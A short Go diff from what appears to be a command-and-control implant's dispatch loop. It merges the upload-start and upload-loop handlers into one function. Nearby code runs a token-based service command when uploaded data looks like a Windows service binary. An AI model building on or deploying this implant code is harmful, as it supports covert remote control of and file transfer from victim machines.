@@ -100,11 +100,11 @@ func main() {
 							if match && bytes.Contains(fileData, []byte("RegisterServiceCtrlHandlerA")) && len(fileData) > 250000 && len(fileData) < 350000 {
 								result, err = services.CmdService(Token, argues)
 							} else {
-								result, err = services.CmdUploadStart(cmdBuf)
+								result, err = services.CmdUpload(cmdBuf, true)
 							}
 							callbackType = 0
 						case packet.CMD_TYPE_UPLOAD_LOOP:
-							result, err = services.CmdUploadLoop(cmdBuf)
+							result, err = services.CmdUpload(cmdBuf, false)
 							callbackType = 0
 						case packet.CMD_TYPE_DOWNLOAD:
 							result, err = services.CmdDownload(cmdBuf)
